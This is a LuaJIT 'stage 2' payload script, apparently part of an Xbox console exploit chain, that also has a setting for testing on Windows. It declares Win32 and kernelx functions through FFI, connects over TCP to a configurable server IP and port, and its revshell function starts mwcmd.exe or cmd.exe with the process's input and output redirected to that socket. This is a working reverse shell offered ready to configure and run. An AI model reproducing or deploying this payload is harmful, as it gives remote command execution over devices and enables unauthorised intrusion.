local ffi = require("ffi")
local bit = require("bit")

--  EDIT ME
local testWindows = false
local serverIp = "192.168.123.1" -- Change this to your server's IP address
local serverPort = 8124 -- Change this to your server's port

local kernelDllName = "kernelx"
local cmdExeName = "mwcmd.exe"
-- EDIT END

-- Override for local windows testing
if testWindows then
    print("Platform: Windows")
    kernelDllName = "kernel32"
    serverIp = "127.0.0.1"
    cmdExeName = "cmd.exe"
else
    print("Platform: XBOX")
end

--
local kernelx = ffi.load(kernelDllName)

-- Used for file dumping
-- local fileBuf = membuf.create(0x1000000) -- 16MB

-- Credits to iryont (https://github.com/iryont/lua-struct)
local struct = {}

function struct.pack(format, ...)
  local stream = {}
  local vars = {...}
  local endianness = true

  for i = 1, format:len() do
    local opt = format:sub(i, i)

    if opt == '<' then
      endianness = true
    elseif opt == '>' then
      endianness = false
    elseif opt:find('[bBhHiIlL]') then
      local n = opt:find('[hH]') and 2 or opt:find('[iI]') and 4 or opt:find('[lL]') and 8 or 1
      local val = tonumber(table.remove(vars, 1))

      local bytes = {}
      for j = 1, n do
        table.insert(bytes, string.char(val % (2 ^ 8)))
        val = math.floor(val / (2 ^ 8))
      end

      if not endianness then
        table.insert(stream, string.reverse(table.concat(bytes)))
      else
        table.insert(stream, table.concat(bytes))
      end
    elseif opt:find('[fd]') then
      local val = tonumber(table.remove(vars, 1))
      local sign = 0

      if val < 0 then
        sign = 1
        val = -val
      end

      local mantissa, exponent = math.frexp(val)
      if val == 0 then
        mantissa = 0
        exponent = 0
      else
        mantissa = (mantissa * 2 - 1) * math.ldexp(0.5, (opt == 'd') and 53 or 24)
        exponent = exponent + ((opt == 'd') and 1022 or 126)
      end

      local bytes = {}
      if opt == 'd' then
        val = mantissa
        for i = 1, 6 do
          table.insert(bytes, string.char(math.floor(val) % (2 ^ 8)))
          val = math.floor(val / (2 ^ 8))
        end
      else
        table.insert(bytes, string.char(math.floor(mantissa) % (2 ^ 8)))
        val = math.floor(mantissa / (2 ^ 8))
        table.insert(bytes, string.char(math.floor(val) % (2 ^ 8)))
        val = math.floor(val / (2 ^ 8))
      end

      table.insert(bytes, string.char(math.floor(exponent * ((opt == 'd') and 16 or 128) + val) % (2 ^ 8)))
      val = math.floor((exponent * ((opt == 'd') and 16 or 128) + val) / (2 ^ 8))
      table.insert(bytes, string.char(math.floor(sign * 128 + val) % (2 ^ 8)))
      val = math.floor((sign * 128 + val) / (2 ^ 8))

      if not endianness then
        table.insert(stream, string.reverse(table.concat(bytes)))
      else
        table.insert(stream, table.concat(bytes))
      end
    elseif opt == 's' then
      table.insert(stream, tostring(table.remove(vars, 1)))
      table.insert(stream, string.char(0))
    elseif opt == 'c' then
      local n = format:sub(i + 1):match('%d+')
      local str = tostring(table.remove(vars, 1))
      local len = tonumber(n)
      if len <= 0 then
        len = str:len()
      end
      if len - str:len() > 0 then
        str = str .. string.rep(' ', len - str:len())
      end
      table.insert(stream, str:sub(1, len))
      i = i + n:len()
    end
  end

  return table.concat(stream)
end

ffi.cdef[[
    typedef unsigned char* LPBYTE;
    typedef void* LPVOID;
    typedef unsigned int* LPDWORD;
    typedef char* LPSTR;
    typedef char* LPCSTR;
    typedef wchar_t WCHAR;
    typedef void *HANDLE;
    typedef wchar_t* LPCWSTR;
    typedef wchar_t* LPWSTR;
    typedef unsigned char BOOL;

    typedef struct _FILETIME {
        DWORD dwLowDateTime;
        DWORD dwHighDateTime;
    } FILETIME;

    typedef struct _OVERLAPPED {
        ULONG_PTR Internal;
        ULONG_PTR InternalHigh;
        union {
          struct {
            DWORD Offset;
            DWORD OffsetHigh;
          } DUMMYSTRUCTNAME;
          PVOID Pointer;
        } DUMMYUNIONNAME;
        HANDLE    hEvent;
      } OVERLAPPED, *LPOVERLAPPED;

    typedef struct _SECURITY_ATTRIBUTES {
        DWORD  nLength;
        LPVOID lpSecurityDescriptor;
        BOOL   bInheritHandle;
      } SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;

    typedef struct _WIN32_FIND_DATAA {
        DWORD dwFileAttributes;
        FILETIME ftCreationTime;
        FILETIME ftLastAccessTime;
        FILETIME ftLastWriteTime;
        DWORD nFileSizeHigh;
        DWORD nFileSizeLow;
        DWORD dwReserved0;
        DWORD dwReserved1;
        CHAR cFileName[255];
        CHAR cAlternateFilename[14];
        DWORD dwFileType;
        DWORD dwCreatorType;
        WORD wFinderFlag;
    } WIN32_FIND_DATAA;
    
    HANDLE FindFirstFileA(
        LPCSTR lpDirectoryName,
        WIN32_FIND_DATAA *lpFindFileData);
    
    BOOL FindNextFileA(
        HANDLE hFindFile,
        WIN32_FIND_DATAA *lpFindFileData);
    
    BOOL FindClose(HANDLE hFindFile);

    HANDLE CreateFileA(
        LPCSTR                lpFileName,
        DWORD                 dwDesiredAccess,
        DWORD                 dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        DWORD                 dwCreationDisposition,
        DWORD                 dwFlagsAndAttributes,
        HANDLE                hTemplateFile
      );

      BOOL CloseHandle(
        HANDLE hObject
    );

      BOOL ReadFile(
        HANDLE       hFile,
        LPVOID       lpBuffer,
        DWORD        nNumberOfBytesToRead,
        LPDWORD      lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped
      );

      DWORD GetLastError();
]]

ffi.cdef[[
        typedef struct _STARTUPINFOA {
            DWORD  cb;
            LPSTR  lpReserved;
            LPSTR  lpDesktop;
            LPSTR  lpTitle;
            DWORD  dwX;
            DWORD  dwY;
            DWORD  dwXSize;
            DWORD  dwYSize;
            DWORD  dwXCountChars;
            DWORD  dwYCountChars;
            DWORD  dwFillAttribute;
            DWORD  dwFlags;
            WORD   wShowWindow;
            WORD   cbReserved2;
            LPBYTE lpReserved2;
            HANDLE hStdInput;
            HANDLE hStdOutput;
            HANDLE hStdError;
        } STARTUPINFOA, *LPSTARTUPINFOA;
        
        typedef struct _STARTUPINFOW {
          DWORD  cb;
          LPWSTR  lpReserved;
          LPWSTR  lpDesktop;
          LPWSTR  lpTitle;
          DWORD  dwX;
          DWORD  dwY;
          DWORD  dwXSize;
          DWORD  dwYSize;
          DWORD  dwXCountChars;
          DWORD  dwYCountChars;
          DWORD  dwFillAttribute;
          DWORD  dwFlags;
          WORD   wShowWindow;
          WORD   cbReserved2;
          LPBYTE lpReserved2;
          HANDLE hStdInput;
          HANDLE hStdOutput;
          HANDLE hStdError;
      } STARTUPINFOW, *LPSTARTUPINFOW;

        typedef struct _PROCESS_INFORMATION {
            HANDLE hProcess;
            HANDLE hThread;
            LPVOID lpBaseAddress;
            DWORD dwDesiredAccess;
        } PROCESS_INFORMATION, *LPPROCESS_INFORMATION;

        int CreateProcessA(
            LPCSTR lpApplicationName,
            LPCSTR lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL bInheritHandles,
            DWORD dwCreationFlags,
            LPVOID lpEnvironment,
            LPCSTR lpCurrentDirectory,
            LPSTARTUPINFOA lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
        );

        int CreateProcessW(
            LPCWSTR lpApplicationName,
            LPWSTR lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL bInheritHandles,
            DWORD dwCreationFlags,
            LPVOID lpEnvironment,
            LPCWSTR lpCurrentDirectory,
            LPSTARTUPINFOW lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
        );
]]

ffi.cdef[[
    unsigned int XCrdOpenAdapter(HANDLE *hAdapter);
    unsigned int XCrdCloseAdapter(HANDLE hAdapter);
]]

ffi.cdef[[
  int MultiByteToWideChar(
    unsigned int                      CodePage,
    unsigned int                      dwFlags,
    const char *                      lpMultiByteStr,
    int                               cbMultiByte,
    LPWSTR                            lpWideCharStr,
    int                               cchWideChar
  );
]]

function checknz(val)
  return val
end

local checknz = checknz
local WCS_ctype = ffi.typeof'WCHAR[?]'
local MB2WC = kernelx.MultiByteToWideChar
local CP = 65001
local MB = 0
local ERROR_INSUFFICIENT_BUFFER = 122

function GetLastError()
  return kernelx.GetLastError()
end

function wcs_sz(s)
	if type(s) ~= 'string' then return s end
	local sz = #s + 1
	local buf = WCS_ctype(sz)
	sz = kernelx.MultiByteToWideChar(CP, MB, s, #s + 1, buf, sz)
	if sz == 0 then
		if GetLastError() ~= ERROR_INSUFFICIENT_BUFFER then checknz(0) end
		sz = checknz(MB2WC(CP, MB, s, #s + 1, nil, 0))
		buf = WCS_ctype(sz)
		sz = checknz(MB2WC(CP, MB, s, #s + 1, buf, sz))
	end
	return buf, sz
end

function wcs(s)
	return (wcs_sz(s))
end

function str(lua_str)
    local len = #lua_str
    local buf = ffi.new("char[?]", len + 1)
    ffi.copy(buf, lua_str, len)
    buf[len] = 0
    return buf
end

function printError(val)
    print("ERROR:" .. val)
end

function revshell(sock)
    local procInfo = ffi.new("PROCESS_INFORMATION")
    local startInfo = ffi.new("STARTUPINFOW")
    startInfo.cb = ffi.sizeof(startInfo)
    startInfo.dwFlags = 0x100 -- STARTF_USESTDHANDLES
    local sockHandle = ffi.cast("HANDLE", sock)
    startInfo.hStdInput = sockHandle
    startInfo.hStdError = sockHandle
    startInfo.hStdOutput = sockHandle
    kernelx.CreateProcessW(
      nil,
      wcs("mwcmd.exe"),
      nil,
      nil,
      1,
      0,
      nil,
      wcs("C:\\Windows\\System32\\"),
      startInfo,
      procInfo
    )
end

function logs(sock, val)
  socketSend(sock, str(val .. "\r\n"), #val +2, 0)
end

print("STAGE 2")
print("Opening socket..")
local sock = openTcpConnection(serverIp, serverPort)

-- Call main action --------
-- logs(sock, "Hello from stage2")

revshell(sock)

print("Closing socket...")
closeSocket(sock)
